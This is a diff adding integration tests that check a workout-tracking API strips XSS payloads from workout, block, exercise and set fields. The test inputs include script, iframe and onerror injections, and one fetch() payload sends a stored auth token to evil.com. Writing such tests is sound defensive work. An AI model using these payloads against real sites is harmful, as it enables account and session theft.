@@ -382,4 +382,207 @@ describe('Workout Routes Integration Tests', () => {
         .expect(401);
     });
   });
+
+  describe('XSS Sanitization', () => {
+    it('should sanitize XSS in workout name on create', async () => {
+      const response = await request(app)
+        .post('/api/workouts')
+        .set('Authorization', `Bearer ${authToken}`)
+        .send({
+          name: '<script>alert("XSS")</script>Push Day',
+          date: '2025-11-05',
+          blocks: [],
+        })
+        .expect(201);
+
+      const workout = response.body;
+      expect(workout.name).toBe('Push Day');
+      expect(workout.name).not.toContain('<script>');
+
+      // Verify sanitized data was stored in database
+      const storedWorkout = await workoutRepo.findById(workout.id);
+      expect(storedWorkout?.name).toBe('Push Day');
+      expect(storedWorkout?.name).not.toContain('<script>');
+    });
+
+    it('should sanitize XSS in workout notes on create', async () => {
+      const response = await request(app)
+        .post('/api/workouts')
+        .set('Authorization', `Bearer ${authToken}`)
+        .send({
+          name: 'Test Workout',
+          date: '2025-11-05',
+          notes: '<iframe src="evil.com"></iframe>Great session',
+          blocks: [],
+        })
+        .expect(201);
+
+      const workout = response.body;
+      expect(workout.notes).toBe('Great session');
+      expect(workout.notes).not.toContain('<iframe');
+
+      // Verify sanitized data was stored in database
+      const storedWorkout = await workoutRepo.findById(workout.id);
+      expect(storedWorkout?.notes).toBe('Great session');
+    });
+
+    it('should sanitize XSS in block label and notes', async () => {
+      const response = await request(app)
+        .post('/api/workouts')
+        .set('Authorization', `Bearer ${authToken}`)
+        .send({
+          name: 'Test Workout',
+          date: '2025-11-05',
+          blocks: [
+            {
+              label: '<script>alert("block")</script>Warm Up',
+              notes: '<img src=x onerror=alert(1)>Dynamic stretching',
+              exercises: [],
+            },
+          ],
+        })
+        .expect(201);
+
+      const workout = response.body;
+      expect(workout.blocks[0].label).toBe('Warm Up');
+      expect(workout.blocks[0].label).not.toContain('<script>');
+      expect(workout.blocks[0].notes).toBe('Dynamic stretching');
+      expect(workout.blocks[0].notes).not.toContain('<img');
+
+      // Verify sanitized data was stored in database
+      const storedWorkout = await workoutRepo.findById(workout.id);
+      expect(storedWorkout?.blocks[0].label).toBe('Warm Up');
+      expect(storedWorkout?.blocks[0].notes).toBe('Dynamic stretching');
+    });
+
+    it('should sanitize XSS in exercise prescription and notes', async () => {
+      const response = await request(app)
+        .post('/api/workouts')
+        .set('Authorization', `Bearer ${authToken}`)
+        .send({
+          name: 'Test Workout',
+          date: '2025-11-05',
+          blocks: [
+            {
+              exercises: [
+                {
+                  exerciseId: exercise1Id,
+                  orderInBlock: 0,
+                  prescription: '<script>alert(1)</script>3 x 8-10',
+                  notes: '<iframe src="evil.com"></iframe>Focus on form',
+                  sets: [
+                    {
+                      setNumber: 1,
+                      weightUnit: 'lbs',
+                    },
+                  ],
+                },
+              ],
+            },
+          ],
+        })
+        .expect(201);
+
+      const workout = response.body;
+      const exercise = workout.blocks[0].exercises[0];
+      expect(exercise.prescription).toBe('3 x 8-10');
+      expect(exercise.prescription).not.toContain('<script>');
+      expect(exercise.notes).toBe('Focus on form');
+      expect(exercise.notes).not.toContain('<iframe');
+
+      // Verify sanitized data was stored in database
+      const storedWorkout = await workoutRepo.findById(workout.id);
+      const storedExercise = storedWorkout?.blocks[0].exercises[0];
+      expect(storedExercise?.prescription).toBe('3 x 8-10');
+      expect(storedExercise?.notes).toBe('Focus on form');
+    });
+
+    it('should sanitize XSS in set notes', async () => {
+      const response = await request(app)
+        .post('/api/workouts')
+        .set('Authorization', `Bearer ${authToken}`)
+        .send({
+          name: 'Test Workout',
+          date: '2025-11-05',
+          blocks: [
+            {
+              exercises: [
+                {
+                  exerciseId: exercise1Id,
+                  orderInBlock: 0,
+                  sets: [
+                    {
+                      setNumber: 1,
+                      weightUnit: 'lbs',
+                      notes: '<script>alert("set")</script>Felt strong',
+                    },
+                  ],
+                },
+              ],
+            },
+          ],
+        })
+        .expect(201);
+
+      const workout = response.body;
+      const set = workout.blocks[0].exercises[0].sets[0];
+      expect(set.notes).toBe('Felt strong');
+      expect(set.notes).not.toContain('<script>');
+
+      // Verify sanitized data was stored in database
+      const storedWorkout = await workoutRepo.findById(workout.id);
+      const storedSet = storedWorkout?.blocks[0].exercises[0].sets[0];
+      expect(storedSet?.notes).toBe('Felt strong');
+    });
+
+    it('should sanitize XSS when updating workout', async () => {
+      // Create a workout
+      const workout = await workoutRepo.create({
+        userId,
+        name: 'Original Name',
+        date: '2025-11-05',
+        notes: 'Original notes',
+        lastModifiedTime: new Date().toISOString(),
+        blocks: [],
+      });
+
+      // Update with XSS payload
+      const response = await request(app)
+        .put(`/api/workouts/${workout.id}`)
+        .set('Authorization', `Bearer ${authToken}`)
+        .send({
+          name: '<svg><script>alert(1)</script></svg>Updated Name',
+          notes: '<img src=x onerror=alert(1)>Updated notes',
+        })
+        .expect(200);
+
+      expect(response.body.name).toBe('Updated Name');
+      expect(response.body.name).not.toContain('<svg>');
+      expect(response.body.notes).toBe('Updated notes');
+      expect(response.body.notes).not.toContain('<img');
+
+      // Verify sanitized data was stored in database
+      const storedWorkout = await workoutRepo.findById(workout.id);
+      expect(storedWorkout?.name).toBe('Updated Name');
+      expect(storedWorkout?.notes).toBe('Updated notes');
+    });
+
+    it('should sanitize complex XSS attack payloads', async () => {
+      const response = await request(app)
+        .post('/api/workouts')
+        .set('Authorization', `Bearer ${authToken}`)
+        .send({
+          name: '<script>fetch("https://evil.com/steal?token=" + localStorage.getItem("authToken"))</script>Workout',
+          date: '2025-11-05',
+          blocks: [],
+        })
+        .expect(201);
+
+      const workout = response.body;
+      expect(workout.name).toBe('Workout');
+      expect(workout.name).not.toContain('fetch');
+      expect(workout.name).not.toContain('localStorage');
+      expect(workout.name).not.toContain('authToken');
+    });
+  });
 });
